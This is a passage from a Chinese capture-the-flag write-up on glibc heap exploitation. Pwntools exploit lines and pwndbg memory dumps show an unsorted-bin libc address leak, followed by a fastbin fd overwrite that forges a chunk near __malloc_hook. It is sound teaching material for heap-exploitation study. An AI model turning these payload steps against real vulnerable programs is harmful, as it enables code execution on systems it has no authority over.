class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<p>程序结构体未发生变化</p>
<h4 id="1-8-申请新堆块-index-5"><a href="#1-8-申请新堆块-index-5" class="headerlink" title="1-8-申请新堆块-index-5"></a>1-8 申请新堆块 index 5</h4>
<p>目的只是为了防止 index4 释放后与 top chunk 合并</p>
<h4 id="1-9-free-index4-，index4-放入-unsorted-bin-中"><a href="#1-9-free-index4-，index4-放入-unsorted-bin-中" class="headerlink" title="1-9-free-index4-，index4-放入-unsorted-bin-中"></a>1-9 free(index4)，index4 放入 unsorted bin 中</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">Free chunk (unsortedbin) | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x91</span><br>fd: <span class="hljs-number">0x00</span><br>bk: <span class="hljs-number">0x7ffff7dd1b78</span><br><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（unsortedbin）</span><br><span class="hljs-number">0x555555757090</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index5</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>    			<span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:	<span class="hljs-number">0x0000555555757010</span>	<span class="hljs-number">0x0000000000000001</span><br>    								<span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>     			<span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:	<span class="hljs-number">0x0000555555757090</span>	<span class="hljs-number">0x0000000000000001</span><br>    							    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>    			<span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000001</span><br>    			<span class="hljs-comment">#（此处发生了改变）	   #index5</span><br><span class="hljs-number">0x5fcead987b0</span>:	<span class="hljs-number">0x0000000000000080</span>	<span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure>
<h4 id="1-10-计算libc基址"><a href="#1-10-计算libc基址" class="headerlink" title="1-10-计算libc基址"></a>1-10 计算libc基址</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">-----------------------------------------------------------------------------<br>还可以直接这样写<br>libc_base = u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))-<span class="hljs-number">0x3c4b78</span><br>-----------------------------------------------------------------------------<br>示例payload的写法：<br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(附件中有工具)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br>-----------------------------------------------------------------------------<br></code></pre></td></tr></tbody></table></figure>
<h3 id="2-控制-malloc-hook"><a href="#2-控制-malloc-hook" class="headerlink" title="2-控制-malloc-hook"></a>2. 控制_malloc_hook</h3>
<h4 id="2-1-申请-unsorted-bin-中的-chunk"><a href="#2-1-申请-unsorted-bin-中的-chunk" class="headerlink" title="2-1-申请-unsorted-bin-中的-chunk"></a>2-1 申请 unsorted bin 中的 chunk</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。<br>
看一下此时的堆内存：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4(由unsortedbin分裂)</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5(由unsortedbin分裂)</span><br><span class="hljs-number">0x555555757100</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000020</span>	<span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6（原index5）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<p>从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x5555557570f0</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x5555557570f0</span><br>BK: <span class="hljs-number">0x5555557570f0</span> ◂— <span class="hljs-number">0x90</span><br>----------------------------------------------------------------------<br>执行payload前：<br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x555555757080</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x555555757080</span><br>----------------------------------------------------------------------<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<h4 id="2-2-free-index4"><a href="#2-2-free-index4" class="headerlink" title="2-2-free-index4"></a>2-2 free(index4)</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#index2_content指针还是指向index4_chunk_data</span><br><span class="hljs-comment">#为了修改之后index4的fd指针，因此我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin （这里显示不准确）<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x71</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x5555557570d0</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x5555557570f0</span><br>Size: <span class="hljs-number">0x90</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757180</span><br>Size: <span class="hljs-number">0x20e61</span><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000020</span>	<span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure>
<h4 id="2-3-修改index4的fd指针"><a href="#2-3-修改index4的fd指针" class="headerlink" title="2-3-修改index4的fd指针"></a>2-3 修改index4的fd指针</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:	<span class="hljs-number">0x00007ffff7dd1aed</span>	<span class="hljs-number">0x0000000000000000</span><br>    			<span class="hljs-comment">#更改index4的fd指针</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000020</span>	<span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/16gx <span class="hljs-number">0x00007ffff7dd1aed</span><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:	<span class="hljs-number">0xfff7dd0260000000</span>	<span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>:	<span class="hljs-number">0xfff7a92ea0000000</span>	<span class="hljs-number">0xfff7a92a7000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:	<span class="hljs-number">0x000000000000007f</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="hljs-number">29</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span 